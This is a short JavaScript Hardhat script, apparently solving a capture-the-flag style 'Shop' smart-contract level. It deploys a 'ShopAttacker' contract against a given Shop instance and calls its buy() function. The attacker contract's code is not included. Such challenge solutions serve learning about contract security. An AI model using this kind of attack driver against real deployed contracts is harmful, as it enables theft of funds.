const {
    SHOP_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink,
} = require('./utils');

async function main(levelName = 'Shop') {
    logStartingLevel(levelName);

    if (!SHOP_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, SHOP_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Shop");
    const contract = factory.attach(SHOP_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("ShopAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.buy();
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
